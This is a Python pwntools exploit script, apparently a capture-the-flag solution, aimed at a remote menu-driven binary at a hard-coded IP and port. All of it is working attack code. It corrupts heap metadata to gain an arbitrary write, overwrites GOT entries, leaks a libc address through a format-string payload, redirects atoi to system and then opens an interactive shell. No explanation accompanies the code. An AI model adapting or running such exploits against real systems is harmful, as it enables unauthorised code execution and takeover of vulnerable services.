from pwn import *

io=remote('101.200.53.148',12301)
#io=process('./pwn')
ELF('./pwn')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc=ELF('../libc-2.23.so')

def add(idx,size,data):
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('idx')
    io.sendline(str(idx))
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)


def edit(idx,data):
    io.recvuntil('>>')
    io.sendline('2')
    io.recvuntil('idx:')
    io.sendline(str(idx))
    io.recvuntil('content:')
    io.send(data)

ptr=0x6020C0
strdup=0x0602068
printf_plt=0x0400700
read_got=0x602048
exit_got=0x602060
atoi_got=0x602058
puts_plt=0x4006D0

[add(0,0x90,'a'*0x90) for i in range(25)]
add(0,0x90,'a')
edit(0,'b'*0x10+p64(ptr+0x100+0x10)+p64(0x41))
add(2,0x90,'a'*0x90)
edit(0,'b'*0x10+p64(0)+p64(0x21)+p64(ptr+0x100+0x10))
add(1,0x21,'a'*0x10)
add(1,0x21,'a'*0x10)
edit(1,p64(exit_got))
edit(2,p64(0x0400AF3))
edit(1,p64(atoi_got))
edit(2,p64(printf_plt))
io.send("aaaa%7$s"+p64(read_got))
io.recvuntil('aaaa')
read_add=u64(io.recv(6).ljust(8,'\x00'))
libc_base=read_add-libc.sym['read']
print(hex(libc_base))
one=libc_base+libc.sym["system"]
io.send('aa\x00')
print(hex(one))
io.send(p64(one))

#gdb.attach(io)



io.interactive()
